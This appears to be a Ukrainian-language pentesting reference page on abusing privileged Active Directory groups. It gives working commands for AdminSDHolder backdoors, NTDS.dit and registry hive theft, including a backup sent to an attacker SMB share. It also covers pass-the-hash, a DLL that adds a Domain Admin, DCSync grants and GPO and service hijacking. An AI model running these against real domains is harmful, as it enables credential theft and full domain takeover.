# Привілейовані групи

{{#include ../../banners/hacktricks-training.md}}

## Відомі групи з адміністративними привілеями

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ця група має повноваження створювати облікові записи та групи, які не є адміністраторами в домені. Крім того, вона дозволяє локальний вхід на Domain Controller (DC).

Щоб визначити учасників цієї групи, виконується така команда:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Додавання нових користувачів дозволено, як і локальний вхід на DC.

## Група AdminSDHolder

Список керування доступом (ACL) групи **AdminSDHolder** є критично важливим, оскільки він встановлює дозволи для всіх "protected groups" в Active Directory, включно з групами з високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.

Зловмисник може використати це, змінивши ACL групи **AdminSDHolder**, надавши стандартному користувачу повні дозволи. Це фактично дасть цьому користувачу повний контроль над усіма protected groups. Якщо дозволи цього користувача будуть змінені або видалені, вони автоматично відновляться протягом години через конструкцію системи.

Остання документація Windows Server досі розглядає кілька вбудованих операторських груп як protected objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Процес SDProp запускається на PDC Emulator кожні 60 хвилин за замовчуванням, проставляє `adminCount=1` і вимикає наслідування прав для protected objects. Це корисно як для persistence, так і для пошуку застарілих привілейованих користувачів, які були видалені з protected group, але все ще зберігають неуспадкований ACL.

Команди для перегляду учасників та зміни дозволів включають:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Доступний скрипт для прискорення процесу відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Для детальнішої інформації відвідайте [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Участь у цій групі дозволяє читати видалені об'єкти Active Directory, що може розкрити чутливу інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Це корисно для **відновлення попередніх шляхів привілеїв**. Видалені об'єкти все ще можуть розкривати `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, старі SPN або DN видаленої привілейованої групи, які пізніше можуть бути відновлені іншим оператором.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

Доступ до файлів на DC обмежено, якщо користувач не є членом групи `Server Operators`, що змінює рівень доступу.

### Privilege Escalation

Використовуючи `PsService` або `sc` з Sysinternals, можна переглядати та змінювати дозволи служб. Група `Server Operators`, наприклад, має повний контроль над певними службами, що дозволяє виконувати довільні команди та privilege escalation:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ця команда показує, що `Server Operators` мають повний доступ, що дозволяє маніпулювати службами для підвищення привілеїв.

## Backup Operators

Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють обходити обмеження доступу: переходити по папках, перелічувати вміст і копіювати файли навіть без явних дозволів, використовуючи прапор `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати спеціальні скрипти.

Щоб перелічити членів групи, виконайте:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Локальна атака

Щоб використати ці привілеї локально, виконуються такі кроки:

1. Імпортувати необхідні бібліотеки:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкнути та перевірити `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Отримання доступу та копіювання файлів з обмежених директорій, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Атака AD

Прямий доступ до файлової системи контролера домену дозволяє викрасти базу даних `NTDS.dit`, яка містить усі NTLM-хеші для користувачів і комп'ютерів домену.

#### Використання diskshadow.exe

1. Створіть теневу копію диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` зі shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Альтернативно, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягнути `SYSTEM` і `SAM` для отримання хешів:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримати всі хеші з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Після вилучення: Pass-the-Hash до DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Використання wbadmin.exe

1. Налаштуйте NTFS-файлову систему для SMB-сервера на машині атакуючого і кешуйте облікові дані SMB на цільовій машині.
2. Використайте `wbadmin.exe` для резервного копіювання системи та вилучення `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Для практичної демонстрації дивіться [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Члени групи **DnsAdmins** можуть використати свої привілеї для завантаження довільної DLL з привілеями SYSTEM на DNS-сервері, який часто розміщується на контролерах домену. Це дає значний потенціал для експлуатації.

Щоб перелічити членів групи **DnsAdmins**, використайте:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ця вразливість дозволяє виконувати довільний код з привілеями SYSTEM у службі DNS (зазвичай всередині DCs). Цю проблему виправлено у 2021 році.

Члени можуть змусити DNS‑сервер завантажити довільну DLL (локально або з віддаленого мережевого ресурсу), використовуючи команди, такі як:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Перезапуск служби DNS (що може вимагати додаткових дозволів) необхідний для завантаження DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для детальнішої інформації про цей вектор атаки зверніться до ired.team.

#### Mimilib.dll

Також можливо використовувати mimilib.dll для виконання команд, модифікуючи його для запуску конкретних команд або reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для більш детальної інформації.

### WPAD запис для MitM

DnsAdmins можуть маніпулювати DNS-записами, щоб проводити Man-in-the-Middle (MitM) атаки, створюючи WPAD-запис після відключення global query block list. Для спуфінгу та перехоплення мережевого трафіку можна використовувати інструменти, такі як Responder або Inveigh.

### Event Log Readers

Члени можуть отримувати доступ до журналів подій і потенційно знаходити чутливу інформацію, таку як plaintext passwords або деталі виконання команд:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ця група може змінювати DACLs на об'єкті домену, потенційно надаючи права DCSync. Техніки для privilege escalation, що експлуатують цю групу, докладно описані в Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Якщо ви можете діяти як член цієї групи, класичне зловживання — надати attacker-controlled principal права реплікації, необхідні для [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Історично **PrivExchange** поєднував доступ до поштових скриньок, примусову аутентифікацію Exchange і LDAP relay, щоб дістатися до цього самого примітива. Навіть якщо шлях LDAP relay пом'якшено, пряме членство в `Exchange Windows Permissions` або контроль над Exchange server залишається високовартісним шляхом до прав реплікації домену.

## Hyper-V Administrators

Hyper-V Administrators мають повний доступ до Hyper-V, який може бути використаний для отримання контролю над віртуалізованими Domain Controllers. Це включає клонування працюючих DC і витяг NTLM hashes з файлу NTDS.dit.

### Exploitation Example

Практичне зловживання зазвичай полягає в **offline access to DC disks/checkpoints** радше ніж у старих host-level LPE трюках. Маючи доступ до Hyper-V host, оператор може зробити checkpoint або експортувати віртуалізований Domain Controller, змонтувати VHDX і витягти `NTDS.dit`, `SYSTEM`, та інші секрети, не торкаючись LSASS всередині гостя:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Звідти повторно використайте робочий процес `Backup Operators` для копіювання `Windows\NTDS\ntds.dit` та гілок реєстру офлайн.

## Group Policy Creators Owners

Ця група дозволяє її учасникам створювати групові політики в домені. Проте її учасники не можуть застосовувати групові політики до користувачів чи груп, ані редагувати існуючі GPOs.

Важлива тонкість: **творець стає власником нового GPO** і зазвичай отримує достатні права для його подальшого редагування. Це робить цю групу цікавою, коли ви можете:

- створити шкідливий GPO і переконати адміністратора прив'язати його до цільового OU/домену
- редагувати GPO, який ви створили і який уже прив'язаний у корисному місці
- зловживати іншим делегованим правом, яке дозволяє прив'язувати GPO, тоді як ця група дає можливість їх редагувати

Практичне зловживання зазвичай означає додавання **Immediate Task**, **startup script**, **local admin membership**, або зміни **user rights assignment** через файли політик, що зберігаються в SYSVOL.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група під назвою **Organization Management** має значні можливості. Ця група має привілей доступу до **поштових скриньок усіх доменних користувачів** та зберігає **повний контроль над 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Цей контроль включає групу **`Exchange Windows Permissions`**, яку можна використати для ескалації привілеїв.

### Privilege Exploitation and Commands

#### Print Operators

Члени групи **Print Operators** мають кілька привілеїв, включно з **`SeLoadDriverPrivilege`**, який дозволяє їм **локально увійти на контролер домену**, вимкнути його та керувати принтерами. Щоб використати ці привілеї, особливо якщо **`SeLoadDriverPrivilege`** не видно в неелевованому контексті, необхідно обійти User Account Control (UAC).

Щоб вивести список учасників цієї групи, використовується наступна команда PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
На контролерах домену ця група є небезпечною, оскільки політика Domain Controller Policy за замовчуванням надає **`SeLoadDriverPrivilege`** групі `Print Operators`. Якщо ви отримаєте підвищений токен для члена цієї групи, ви можете увімкнути привілей і завантажити підписаний, але уразливий драйвер, щоб піднятися до kernel/SYSTEM. Для деталей обробки токенів див. [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Користувачі віддаленого робочого столу

Членам цієї групи надається доступ до ПК через Remote Desktop Protocol (RDP). Щоб перерахувати цих учасників, доступні команди PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткові відомості щодо експлуатації RDP можна знайти в спеціалізованих ресурсах з pentesting.

#### Користувачі віддаленого керування

Члени можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перерахування цих членів здійснюється за допомогою:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Для технік експлуатації, пов'язаних з **WinRM**, слід звертатися до відповідної документації.

#### Оператори серверів

Ця група має права виконувати різні налаштування на контролерах домену, включно з привілеями резервного копіювання та відновлення, зміною системного часу та вимкненням системи. Щоб перерахувати членів групи, наведено таку команду:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
На контролерах домену, `Server Operators` зазвичай успадковують достатньо прав, щоб **переналаштувати або запускати/зупиняти служби** та також отримують `SeBackupPrivilege`/`SeRestorePrivilege` через стандартну політику DC. На практиці це робить їх мостом між **service-control abuse** та **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Якщо ACL служби надає цій групі права зміни/запуску, перенаправте службу на довільну команду, запустіть її як `LocalSystem`, а потім відновіть оригінальний `binPath`. Якщо керування службами обмежене, поверніться до наведених вище технік для `Backup Operators`, щоб скопіювати `NTDS.dit`.

## Посилання <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
